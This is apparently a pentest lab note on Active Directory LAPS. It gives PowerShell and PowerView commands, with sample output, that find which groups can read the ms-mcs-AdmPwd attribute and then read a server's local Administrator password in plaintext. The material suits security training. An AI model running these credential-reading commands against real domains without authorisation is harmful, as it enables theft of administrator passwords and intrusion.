# LAPS

LAPS is a mechanism that randomises the password of the default Administrator account of servers. Only privileged users of the domain should be able to read this password.

The password of the account is stored in the attribute `mc-mcs-AdmPwd`.

We will need the LAPS PowerShell module:

```powershell
# Import AD module
> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
# Import LAPS module
> Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1 -Verbose
```

## List OUs where LAPS is used

### With script

```powershell
> C:\AD\Tools\Get-LapsPermissions.ps1
Read Rights

organizationalUnit                     IdentityReference
------------------                     -----------------
OU=MailMgmt,DC=us,DC=techcorp,DC=local US\studentusers

Write Rights

OU=MailMgmt,DC=us,DC=techcorp,DC=local NT AUTHORITY\SELF
```

This means that members of the group `US\studentusers` can read the LAPS passwords of all principals under the OU `MailMgmt`.

List members of OU with: [#list-ous](../active-directory-enumeration/todo.md#list-ous "mention").

### Manually

It is also possible to directly list all the OUs for which we have read rights on the attribute `ms-mcs-AdmPwd`. The following command also retrieves the identity of the principals that can read this attribute:

```powershell
> Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object { ($_.ObjectAceType -like 'ms-mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
AceQualifier           : AccessAllowed
ObjectDN               : OU=MailMgmt,DC=us,DC=techcorp,DC=local
ActiveDirectoryRights  : ReadProperty, ExtendedRight
ObjectAceType          : ms-Mcs-AdmPwd
ObjectSID              :
InheritanceFlags       : ContainerInherit
BinaryLength           : 72
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-21-210670787-2521448726-163245708-1116
AccessMask             : 272
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit, InheritOnly
InheritedObjectAceType : Computer
OpaqueLength           : 0
IdentityName           : US\studentusers
```

As for the `Get-LapsPermissions.ps1` script, we learn that `US\studentusers` can read LAPS passwords of the OU `MailMgmt`.

## Read LAPS password of machine

```powershell
> Get-ADComputer -Identity us-mailmgmt -Properties ms-mcs-AdmPwd | Select -expand ms-mcs-admpwd
[LapsModule]> Get-LapsADPassword -Identity us-mailmgmt -AsPlainText
[PowerView]> Get-DomainObject -Identity us-mailmgmt | select -expand ms-mcs-admpwd
```
